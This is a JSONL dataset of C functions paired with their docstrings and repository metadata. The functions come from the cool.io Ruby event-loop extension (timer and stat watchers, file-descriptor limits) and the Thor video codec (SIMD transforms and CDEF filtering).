{"docstring": "/**\n *  call-seq:\n *    Coolio::TimerWatcher#reset -> Coolio::TimerWatcher\n * \n * Reset the TimerWatcher.  This behaves differently depending on if it's repeating.\n *\n * If the timer is pending, its pending status is cleared.\n * \n * If the timer is attached but nonrepeating, stop it (as if it timed out)\n *\n * If the timer is repeating, reset it so it will fire again after its given interval\n */\n", "func_signal": "static VALUE Coolio_TimerWatcher_reset(VALUE self)", "code": "{\n  struct Coolio_Watcher *watcher_data;\n  struct Coolio_Loop *loop_data;\n\n  Data_Get_Struct(self, struct Coolio_Watcher, watcher_data);\n\n  if(watcher_data->loop == Qnil)\n    rb_raise(rb_eRuntimeError, \"not attached to a loop\");\n\n  Data_Get_Struct(watcher_data->loop, struct Coolio_Loop, loop_data);\n\n  ev_timer_again(loop_data->ev_loop, &watcher_data->event_types.ev_timer);\n\n  return self;\n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/* Coolio::Loop dispatch callback */\n", "func_signal": "static void Coolio_TimerWatcher_dispatch_callback(VALUE self, int revents)", "code": "{ \n  if(revents & EV_TIMEOUT)\n    rb_funcall(self, rb_intern(\"on_timer\"), 0);\n  else\n    rb_raise(rb_eRuntimeError, \"unknown revents value for ev_timer: %d\", revents);\n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n * Convience method to build StatInfo structs given an ev_statdata\n * */\n", "func_signal": "static VALUE Coolio_StatInfo_build(ev_statdata *statdata_struct)", "code": "{\n  VALUE at_method = rb_intern(\"at\");\n  VALUE cTime     = rb_const_get(rb_cObject, rb_intern(\"Time\"));\n\n  VALUE mtime     = Qnil;\n  VALUE ctime     = Qnil;\n  VALUE atime     = Qnil;\n  VALUE dev       = Qnil;\n  VALUE ino       = Qnil;\n  VALUE mode      = Qnil;\n  VALUE nlink     = Qnil;\n  VALUE uid       = Qnil;\n  VALUE gid       = Qnil;\n  VALUE rdev      = Qnil;\n  VALUE size      = Qnil;\n  VALUE blksize   = Qnil;\n  VALUE blocks    = Qnil;\n\n  mtime   = rb_funcall(cTime, at_method, 1, INT2NUM(statdata_struct->st_mtime));\n  ctime   = rb_funcall(cTime, at_method, 1, INT2NUM(statdata_struct->st_ctime));\n  atime   = rb_funcall(cTime, at_method, 1, INT2NUM(statdata_struct->st_atime));\n  dev     = INT2NUM(statdata_struct->st_dev);\n  ino     = INT2NUM(statdata_struct->st_ino);\n  mode    = INT2NUM(statdata_struct->st_mode);\n  nlink   = INT2NUM(statdata_struct->st_nlink);\n  uid     = INT2NUM(statdata_struct->st_uid);\n  gid     = INT2NUM(statdata_struct->st_gid);\n  rdev    = INT2NUM(statdata_struct->st_rdev);\n  size    = INT2NUM(statdata_struct->st_size);\n#ifdef HAVE_ST_BLKSIZE\n  blksize = INT2NUM(statdata_struct->st_blksize);\n  blocks  = INT2NUM(statdata_struct->st_blocks);\n#endif\n\n  return rb_struct_new(cCoolio_StatInfo,\n      mtime,\n      ctime,\n      atime,\n      dev,\n      ino,\n      mode,\n      nlink,\n      uid,\n      gid,\n      rdev,\n      size,\n      blksize,\n      blocks,\n      NULL);\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::TimerWatcher.disable -> Coolio::TimerWatcher\n * \n * Temporarily disable a timer watcher which is attached to a loop.  \n * This is useful if you wish to toggle event monitoring on and off.  \n */\n", "func_signal": "static VALUE Coolio_TimerWatcher_disable(VALUE self)", "code": "{\n  Watcher_Disable(timer, self);\n\n  return self;\n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::Utils.maxfds=(count) -> Integer\n * \n * Set the number of file descriptors available to the process.  May require\n * superuser privileges.\n */\n", "func_signal": "static VALUE Coolio_Utils_setmaxfds(VALUE self, VALUE max)", "code": "{\n#ifdef HAVE_SYS_RESOURCE_H\n  struct rlimit rlim;\n\n  rlim.rlim_cur = NUM2INT(max);\n\n  if(setrlimit(RLIMIT_NOFILE, &rlim) < 0)\n    rb_sys_fail(\"setrlimit\");\n\n  return max;\n#endif\n\n#ifndef HAVE_SYS_RESOURCE_H\n  rb_raise(rb_eRuntimeError, \"operation not supported\");\n#endif\n}", "path": "cool.io/ext/cool.io/utils.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::TimerWatcher.enable -> Coolio::TimerWatcher\n * \n * Re-enable a timer watcher which has been temporarily disabled.  See the\n * disable method for a more thorough explanation.\n */\n", "func_signal": "static VALUE Coolio_TimerWatcher_enable(VALUE self)", "code": "{\n  Watcher_Enable(timer, self);\n\n  return self;  \n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::StatWatcher.attach(loop) -> Coolio::StatWatcher\n *\n * Attach the stat watcher to the given Coolio::Loop.  If the watcher is already\n * attached to a loop, detach it from the old one and attach it to the new one.\n */\n", "func_signal": "static VALUE Coolio_StatWatcher_attach(VALUE self, VALUE loop)", "code": "{\n  ev_tstamp interval, timeout;\n  struct Coolio_Loop *loop_data;\n  struct Coolio_Watcher *watcher_data;\n\n  if(!rb_obj_is_kind_of(loop, cCoolio_Loop))\n    rb_raise(rb_eArgError, \"expected loop to be an instance of Coolio::Loop, not %s\", RSTRING_PTR(rb_inspect(loop)));\n\n  Data_Get_Struct(loop, struct Coolio_Loop, loop_data);\n  Data_Get_Struct(self, struct Coolio_Watcher, watcher_data);\n\n  if(watcher_data->loop != Qnil)\n    Coolio_StatWatcher_detach(self);\n\n  watcher_data->loop = loop;\n\n  ev_stat_start(loop_data->ev_loop, &watcher_data->event_types.ev_stat);\n\trb_call_super(1, &loop);\n\n  return self;\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::StatWatcher.disable -> Coolio::StatWatcher\n *\n * Temporarily disable a stat watcher which is attached to a loop.\n * This is useful if you wish to toggle event monitoring on and off.\n */\n", "func_signal": "static VALUE Coolio_StatWatcher_disable(VALUE self)", "code": "{\n  Watcher_Disable(stat, self);\n\n  return self;\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::Utils.maxfds -> Integer\n * \n * Return the maximum number of files descriptors available to the process\n */\n", "func_signal": "static VALUE Coolio_Utils_maxfds(VALUE self)", "code": "{\n#ifdef HAVE_SYS_RESOURCE_H\n  struct rlimit rlim;\n\n  if(getrlimit(RLIMIT_NOFILE, &rlim) < 0)\n    rb_sys_fail(\"getrlimit\");\n\n  return INT2NUM(rlim.rlim_cur);\n#endif\n\n#ifndef HAVE_SYS_RESOURCE_H\n  rb_raise(rb_eRuntimeError, \"operation not supported\");\n#endif\n}", "path": "cool.io/ext/cool.io/utils.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/*\n * Coolio::TimerWatcher lets you create either one-shot or periodic timers which\n * run within Coolio's event loop.  It's useful for creating timeouts or\n * events which fire periodically.\n */\n", "func_signal": "void Init_coolio_timer_watcher()", "code": "{ \n  mCoolio = rb_define_module(\"Coolio\");\n  cCoolio_Watcher = rb_define_class_under(mCoolio, \"Watcher\", rb_cObject);\n  cCoolio_TimerWatcher = rb_define_class_under(mCoolio, \"TimerWatcher\", cCoolio_Watcher);\n  cCoolio_Loop = rb_define_class_under(mCoolio, \"Loop\", rb_cObject);\n\n  rb_define_method(cCoolio_TimerWatcher, \"initialize\", Coolio_TimerWatcher_initialize, -1);\n  rb_define_method(cCoolio_TimerWatcher, \"attach\", Coolio_TimerWatcher_attach, 1);\n  rb_define_method(cCoolio_TimerWatcher, \"detach\", Coolio_TimerWatcher_detach, 0);\n  rb_define_method(cCoolio_TimerWatcher, \"enable\", Coolio_TimerWatcher_enable, 0);\n  rb_define_method(cCoolio_TimerWatcher, \"disable\", Coolio_TimerWatcher_disable, 0);\n  rb_define_method(cCoolio_TimerWatcher, \"reset\", Coolio_TimerWatcher_reset, 0);\n  rb_define_method(cCoolio_TimerWatcher, \"on_timer\", Coolio_TimerWatcher_on_timer, 0);\n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::StatWatcher.initialize(path, interval = 0) -> Coolio::StatWatcher\n *\n * Create a new Coolio::StatWatcher for the given path.  This will monitor the\n * given path for changes at the filesystem level.  The interval argument\n * specified how often in seconds the path should be polled for changes.\n * Setting interval to zero uses an \"automatic\" value (typically around 5\n * seconds) which optimizes performance.  Otherwise, values less than\n * 0.1 are not particularly meaningful.  Where available (at present, on Linux)\n * high performance file monitoring interfaces will be used instead of polling.\n */\n", "func_signal": "static VALUE Coolio_StatWatcher_initialize(int argc, VALUE *argv, VALUE self)", "code": "{\n\tVALUE path, interval;\n  struct Coolio_Watcher *watcher_data;\n\n  rb_scan_args(argc, argv, \"11\", &path, &interval);\n  if(interval != Qnil)\n    interval = rb_convert_type(interval, T_FLOAT, \"Float\", \"to_f\");\n\n  path = rb_String(path);\n  rb_iv_set(self, \"@path\", path);\n\n  Data_Get_Struct(self, struct Coolio_Watcher, watcher_data);\n\n  watcher_data->dispatch_callback = Coolio_StatWatcher_dispatch_callback;\n  ev_stat_init(\n      &watcher_data->event_types.ev_stat,\n      Coolio_StatWatcher_libev_callback,\n      RSTRING_PTR(path),\n      interval == Qnil ? 0 : NUM2DBL(interval)\n  );\n  watcher_data->event_types.ev_stat.data = (void *)self;\n\n  return Qnil;\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/* Initialize the coolness */\n", "func_signal": "void Init_cool()", "code": "{\n  /* Initializers for other modules */\n  Init_coolio_loop();\n  Init_coolio_watcher();\n  Init_coolio_iowatcher();\n  Init_coolio_timer_watcher();\n  Init_coolio_stat_watcher();\n  Init_coolio_utils();\n}", "path": "cool.io/ext/cool.io/cool.io_ext.c", "commit_date": "2010-11-06 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::TimerWatcher.detach -> Coolio::TimerWatcher\n * \n * Detach the timer watcher from its current Coolio::Loop.\n */\n", "func_signal": "static VALUE Coolio_TimerWatcher_detach(VALUE self)", "code": "{\n  Watcher_Detach(timer, self);\n\n  return self;\n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/* 4x4 transform, both dimensions */\n", "func_signal": "static void transform4(const int32_t *src, int32_t *dst, int bitdepth)", "code": "{\n  v256 t;\n  v256 add1 = v256_dup_64(1 << (bitdepth - 7));\n  v256 add2 = v256_dup_64(64);\n  int shift1 = bitdepth - 6;\n  v128 h0, h1, h2, h3;\n  v128 g0 = v128_from_128(0x0040004000400040LL); /*  64  64  64  64 */\n  v128 g1 = v128_from_128(0xffadffdc00240053LL); /* -83 -36  36  83 */\n  v128 g2 = v128_from_128(0x0040ffc0ffc00040LL); /*  64 -64 -64  64 */\n  v128 g3 = v128_from_128(0xffdc0053ffad0024LL); /* -36  83 -83  36 */\n  v128 s0 = v128_load_aligned(src + 0*4);\n  v128 s1 = v128_load_aligned(src + 1*4);\n  v128 s2 = v128_load_aligned(src + 2*4);\n  v128 s3 = v128_load_aligned(src + 3*4);\n\n  /* Horizontal transform */\n  t = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(s3, g0),\n                                            (int32_t)v128_dotp_s32(s2, g0),\n                                            (int32_t)v128_dotp_s32(s1, g0),\n                                            (int32_t)v128_dotp_s32(s0, g0)), add1), shift1);\n  h0 = v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t));\n\n  t = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(s3, g1),\n                                            (int32_t)v128_dotp_s32(s2, g1),\n                                            (int32_t)v128_dotp_s32(s1, g1),\n                                            (int32_t)v128_dotp_s32(s0, g1)), add1), shift1);\n  h1 = v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t));\n\n  t = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(s3, g2),\n                                            (int32_t)v128_dotp_s32(s2, g2),\n                                            (int32_t)v128_dotp_s32(s1, g2),\n                                            (int32_t)v128_dotp_s32(s0, g2)), add1), shift1);\n  h2 = v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t));\n\n  t = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(s3, g3),\n                                            (int32_t)v128_dotp_s32(s2, g3),\n                                            (int32_t)v128_dotp_s32(s1, g3),\n                                            (int32_t)v128_dotp_s32(s0, g3)), add1), shift1);\n  h3 = v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t));\n\n  /* Vertical transform */\n  t = v256_shr_n_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(h3, g0),\n                                              (int32_t)v128_dotp_s32(h2, g0),\n                                              (int32_t)v128_dotp_s32(h1, g0),\n                                              (int32_t)v128_dotp_s32(h0, g0)), add2), 7);\n  v128_store_aligned(dst +  0, v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t)));\n\n  t = v256_shr_n_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(h3, g1),\n                                              (int32_t)v128_dotp_s32(h2, g1),\n                                              (int32_t)v128_dotp_s32(h1, g1),\n                                              (int32_t)v128_dotp_s32(h0, g1)), add2), 7);\n  v128_store_aligned(dst +  4, v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t)));\n\n  t = v256_shr_n_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(h3, g2),\n                                              (int32_t)v128_dotp_s32(h2, g2),\n                                              (int32_t)v128_dotp_s32(h1, g2),\n                                              (int32_t)v128_dotp_s32(h0, g2)), add2), 7);\n  v128_store_aligned(dst +  8, v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t)));\n\n  t = v256_shr_n_s64(v256_add_64(v256_from_v64((int32_t)v128_dotp_s32(h3, g3),\n                                              (int32_t)v128_dotp_s32(h2, g3),\n                                              (int32_t)v128_dotp_s32(h1, g3),\n                                              (int32_t)v128_dotp_s32(h0, g3)), add2), 7);\n  v128_store_aligned(dst + 12, v128_pack_s64_s32(v256_high_v128(t), v256_low_v128(t)));\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "// sign(a - b) * min(abs(a - b), max(0, strength - (abs(a - b) >> adjdamp)))\n", "func_signal": "SIMD_INLINE v256 constrain8(v256 a, v256 b, unsigned int strength,\n                            unsigned int adjdamp)", "code": "{\n  const v256 diff16 = v256_sub_16(a, b);\n  v256 diff = v256_pack_s32_s16(v256_high_v128(diff16), v256_low_v128(diff16));\n  const v256 sign = v256_cmplt_s16(diff, v256_zero());\n  diff = v128_abs_s8(diff);\n  return v256_xor(\n      v256_add_16(sign,\n                 v256_min_u16(diff, v256_ssub_u16(v256_dup_16(strength),\n                                                v256_shr_u16(diff, adjdamp)))),\n      sign);\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* 16x16 inverse transform assuming everything but top left 4x4 is 0 */\n", "func_signal": "static void inverse_transform16_4x4(const int32_t *coeff, int32_t *block, int bitdepth)", "code": "{\n  static const ALIGN(16) int32_t c[] = {\n     64,  89,  64,  89,  64,  89,  64,  89,\n     90,  87,  90,  87,  90,  87,  90,  87,\n     64,  75,  64,  75,  64,  75,  64,  75,\n    -87, -57, -87, -57, -87, -57, -87, -57,\n     64,  50,  64,  50,  64,  50,  64,  50,\n     80,   9,  80,   9,  80,   9,  80,   9,\n     64,  18,  64,  18,  64,  18,  64,  18,\n    -70,  43, -70,  43, -70,  43, -70,  43,\n     64, -18,  64, -18,  64, -18,  64, -18,\n     57, -80,  57, -80,  57, -80,  57, -80,\n     64, -50,  64, -50,  64, -50,  64, -50,\n    -43,  90, -43,  90, -43,  90, -43,  90,\n     64, -75,  64, -75,  64, -75,  64, -75,\n     25, -70,  25, -70,  25, -70,  25, -70,\n     64, -89,  64, -89,  64, -89,  64, -89,\n     -9,  25,  -9,  25,  -9,  25,  -9,  25 };\n  v256 t[8];\n  v256 t0, t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11;\n  v256 round = v256_dup_64(64);\n  int shift2 = 20 - bitdepth;\n  v256 load0 = v256_from_v128(v128_load_aligned(coeff + 16), v128_load_aligned(coeff +  0));\n  v256 load1 = v256_from_v128(v128_load_aligned(coeff + 48), v128_load_aligned(coeff + 32));\n  v256 lo = v256_ziplo_32(load1, load0);\n  v256 hi = v256_ziphi_32(load1, load0);\n  int i, j;\n\n  for (i = 0; i < 4; i++) {\n    v256 t0 = v256_madd_s32(v256_load_aligned(c + i*32 +  0), lo);\n    v256 t1 = v256_madd_s32(v256_load_aligned(c + i*32 +  8), hi);\n    v256 t2 = v256_madd_s32(v256_load_aligned(c + i*32 + 16), lo);\n    v256 t3 = v256_madd_s32(v256_load_aligned(c + i*32 + 24), hi);\n    t[i*2+0] = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_sub_64(t2, t3), round), 7),\n                                 v256_shr_n_s64(v256_add_64(v256_add_64(t0, t1), round), 7));\n    t[i*2+1] = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_sub_64(t0, t1), round), 7),\n                                 v256_shr_n_s64(v256_add_64(v256_add_64(t2, t3), round), 7));\n  }\n\n  t0 = v256_ziplo_128(t[2], t[0]);\n  t1 = v256_ziphi_128(t[2], t[0]);\n  t2 = v256_ziplo_32(t1, t0);\n  t3 = v256_ziphi_32(t1, t0);\n  t4 = v256_ziplo_64(t3, t2);\n  t6 = v256_ziphi_64(t3, t2);\n\n  t0 = v256_ziplo_128(t[6], t[4]);\n  t1 = v256_ziphi_128(t[6], t[4]);\n  t2 = v256_ziplo_32(t1, t0);\n  t3 = v256_ziphi_32(t1, t0);\n  t8 = v256_ziplo_64(t3, t2);\n  t10 = v256_ziphi_64(t3, t2);\n\n  t0 = v256_ziplo_128(t[5], t[7]);\n  t1 = v256_ziphi_128(t[5], t[7]);\n  t2 = v256_ziplo_32(t1, t0);\n  t3 = v256_ziphi_32(t1, t0);\n  t9 = v256_ziplo_64(t3, t2);\n  t11 = v256_ziphi_64(t3, t2);\n\n  t0 = v256_ziplo_128(t[1], t[3]);\n  t1 = v256_ziphi_128(t[1], t[3]);\n  t2 = v256_ziplo_32(t1, t0);\n  t3 = v256_ziphi_32(t1, t0);\n  t5 = v256_ziplo_64(t3, t2);\n  t7 = v256_ziphi_64(t3, t2);\n\n  t0 = v256_ziplo_128(t5, t9);\n  t1 = v256_ziphi_128(t5, t9);\n  t2 = v256_ziplo_128(t8, t4);\n  t3 = v256_ziphi_128(t8, t4);\n  t4 = v256_ziplo_128(t10, t6);\n  t5 = v256_ziphi_128(t10, t6);\n  t6 = v256_ziplo_128(t7, t11);\n  t7 = v256_ziphi_128(t7, t11);\n\n  t8 = v256_ziplo_32(t7, t1);\n  t7 = v256_ziphi_32(t7, t1);\n  t1 = v256_ziplo_32(t6, t0);\n  t0 = v256_ziphi_32(t6, t0);\n  t6 = v256_ziplo_32(t4, t2);\n  t10 = v256_ziphi_32(t4, t2);\n  t11 = v256_ziplo_32(t5, t3);\n  t3 = v256_ziphi_32(t5, t3);\n\n  round = v256_dup_64(1 << (19 - bitdepth));\n\n  for (i = 0; i < 8; i++) {\n    int i1 = i*16;\n    int i2 = 240 - i1;\n    int i3 = i & 1 ? i2 - 120 : i1;\n    int i4 = i & 1 ? i1 : i2 - 120;\n    int i5 = i & 1 ? i2 : i1 + 120;\n    int i6 = i & 1 ? i1 + 120 : i2;\n    v256 c0 = v256_load_aligned(c + i1 + 0);\n    v256 c1 = v256_load_aligned(c + i1 + 8);\n    v256 v0 = v256_madd_s32(c0, t10);\n    v256 v1 = v256_madd_s32(c0, t6);\n    v256 v2 = v256_madd_s32(c1, t11);\n    v256 v3 = v256_madd_s32(c1, t3);\n    v256_store_aligned(block + i3,\n                       v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_add_64(v0, v3), round), shift2),\n                                         v256_shr_s64(v256_add_64(v256_add_64(v1, v2), round), shift2)));\n    v256_store_aligned(block + i4,\n                       v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_sub_64(v0, v3), round), shift2),\n                                         v256_shr_s64(v256_add_64(v256_sub_64(v1, v2), round), shift2)));\n\n    v0 = v256_madd_s32(c0, t0);\n    v1 = v256_madd_s32(c0, t1);\n    v2 = v256_madd_s32(c1, t8);\n    v3 = v256_madd_s32(c1, t7);\n    v256_store_aligned(block + 8 + i5,\n                       v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_add_64(v0, v3), round), shift2),\n                                         v256_shr_s64(v256_add_64(v256_add_64(v1, v2), round), shift2)));\n    v256_store_aligned(block + 8 + i6,\n                       v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_sub_64(v0, v3), round), shift2),\n                                         v256_shr_s64(v256_add_64(v256_sub_64(v1, v2), round), shift2)));\n  }\n\n  for (i = 0; i < 16; i += 8)\n    for (j = 0; j < 16; j += 8) {\n      int32_t *p = block + i*16 + j;\n      v256 load0 = v256_load_aligned(p +   0);\n      v256 load1 = v256_load_aligned(p +  16);\n      v256 load2 = v256_load_aligned(p +  32);\n      v256 load3 = v256_load_aligned(p +  48);\n      v256 load4 = v256_load_aligned(p +  64);\n      v256 load5 = v256_load_aligned(p +  80);\n      v256 load6 = v256_load_aligned(p +  96);\n      v256 load7 = v256_load_aligned(p + 112);\n      v256 t3  = v256_ziplo_32(load1, load0);\n      v256 t4  = v256_ziphi_32(load1, load0);\n      v256 t7  = v256_ziplo_32(load3, load2);\n      v256 t8  = v256_ziphi_32(load3, load2);\n      v256 t11 = v256_ziplo_32(load5, load4);\n      v256 t12 = v256_ziphi_32(load5, load4);\n      v256 t15 = v256_ziplo_32(load7, load6);\n      v256 t16 = v256_ziphi_32(load7, load6);\n      v256 t17 = v256_ziplo_64(t7, t3);\n      v256 t18 = v256_ziphi_64(t7, t3);\n      v256 t19 = v256_ziplo_64(t8, t4);\n      v256 t20 = v256_ziphi_64(t8, t4);\n      v256 t21 = v256_ziplo_64(t15, t11);\n      v256 t22 = v256_ziphi_64(t15, t11);\n      v256 t23 = v256_ziplo_64(t16, t12);\n      v256 t24 = v256_ziphi_64(t16, t12);\n      v256_store_aligned(p +   0, v256_ziplo_128(t21, t17));\n      v256_store_aligned(p +  16, v256_ziphi_128(t21, t17));\n      v256_store_aligned(p +  32, v256_ziplo_128(t22, t18));\n      v256_store_aligned(p +  48, v256_ziphi_128(t22, t18));\n      v256_store_aligned(p +  64, v256_ziplo_128(t23, t19));\n      v256_store_aligned(p +  80, v256_ziphi_128(t23, t19));\n      v256_store_aligned(p +  96, v256_ziplo_128(t24, t20));\n      v256_store_aligned(p + 112, v256_ziphi_128(t24, t20));\n    }\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Smooth in the direction detected. */\n", "func_signal": "void cdef_filter_block(uint8_t *dst8, uint16_t *dst16, int dstride,\n                       const uint16_t *in, int sstride, int pri_strength, int sec_strength,\n                       int dir, int pri_damping, int sec_damping, int bsize, int cdef_directions[8][2 + CDEF_FULL], int coeff_shift)", "code": "{\n  int i, j, k;\n  const int *pri_taps = cdef_pri_taps[(pri_strength >> coeff_shift) & 1];\n  const int *sec_taps = cdef_sec_taps[(pri_strength >> coeff_shift) & 1];\n  for (i = 0; i < bsize; i++) {\n    for (j = 0; j < bsize; j++) {\n      int16_t sum = 0;\n      int16_t y;\n      int16_t x = in[i * sstride + j];\n      int mx = x;\n      int mn = x;\n#if CDEF_FULL\n      for (k = 0; k < 3; k++)\n#else\n      for (k = 0; k < 2; k++)\n#endif\n      {\n        int16_t p0 = in[i * sstride + j + cdef_directions[dir][k]];\n        int16_t p1 = in[i * sstride + j - cdef_directions[dir][k]];\n        sum += pri_taps[k] * constrain(p0 - x, pri_strength, pri_damping);\n        sum += pri_taps[k] * constrain(p1 - x, pri_strength, pri_damping);\n        if (p0 != CDEF_VERY_LARGE) mx = max(p0, mx);\n        if (p1 != CDEF_VERY_LARGE) mx = max(p1, mx);\n        mn = min(p0, mn);\n        mn = min(p1, mn);\n#if CDEF_FULL\n        if (k == 2) continue;\n#endif\n        int16_t s0 = in[i * sstride + j + cdef_directions[(dir + 2) & 7][k]];\n        int16_t s1 = in[i * sstride + j - cdef_directions[(dir + 2) & 7][k]];\n        int16_t s2 = in[i * sstride + j + cdef_directions[(dir + 6) & 7][k]];\n        int16_t s3 = in[i * sstride + j - cdef_directions[(dir + 6) & 7][k]];\n        if (s0 != CDEF_VERY_LARGE) mx = max(s0, mx);\n        if (s1 != CDEF_VERY_LARGE) mx = max(s1, mx);\n        if (s2 != CDEF_VERY_LARGE) mx = max(s2, mx);\n        if (s3 != CDEF_VERY_LARGE) mx = max(s3, mx);\n        mn = min(s0, mn);\n        mn = min(s1, mn);\n        mn = min(s2, mn);\n        mn = min(s3, mn);\n        sum += sec_taps[k] * constrain(s0 - x, sec_strength, sec_damping);\n        sum += sec_taps[k] * constrain(s1 - x, sec_strength, sec_damping);\n        sum += sec_taps[k] * constrain(s2 - x, sec_strength, sec_damping);\n        sum += sec_taps[k] * constrain(s3 - x, sec_strength, sec_damping);\n      }\n      y = clip((int16_t)x + ((8 + sum - (sum < 0)) >> 4), mn, mx);\n      if (dst8)\n        dst8[i * dstride + j] = (uint8_t)y;\n      else\n        dst16[i * dstride + j] = (uint16_t)y;\n    }\n  }\n}", "path": "thor/common/common_block.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* partial A is a 16-bit vector of the form:\n   [x8 x7 x6 x5 x4 x3 x2 x1] and partial B has the form:\n   [0  y1 y2 y3 y4 y5 y6 y7].\n   This function computes (x1^2+y1^2)*C1 + (x2^2+y2^2)*C2 + ...\n   (x7^2+y2^7)*C7 + (x8^2+0^2)*C8 where the C1..C8 constants are in const1\n   and const2. */\n", "func_signal": "SIMD_INLINE v256 fold_mul_and_sum(v256 partiala, v256 partialb, v256 const1,\n                                  v256 const2)", "code": "{\n  v256 tmp;\n  /* Reverse partial B. */\n  partialb = v256_pshuffle_8(\n      partialb, v256_from_v64(0x0f0e0100, 0x03020504, 0x07060908, 0x0b0a0d0c));\n  /* Interleave the x and y values of identical indices and pair x8 with 0. */\n  tmp = partiala;\n  partiala = v256_ziplo_32(partialb, partiala);\n  partialb = v256_ziphi_32(partialb, tmp);\n  /* Square and add the corresponding x and y values. */\n  partiala = v256_madd_s32(partiala, partiala);\n  partialb = v256_madd_s32(partialb, partialb);\n  /* Multiply by constant. */\n  partiala = v256_mullo_s64(partiala, const1);\n  partialb = v256_mullo_s64(partialb, const2);\n  /* Sum all results. */\n  partiala = v256_add_64(partiala, partialb);\n  return partiala;\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
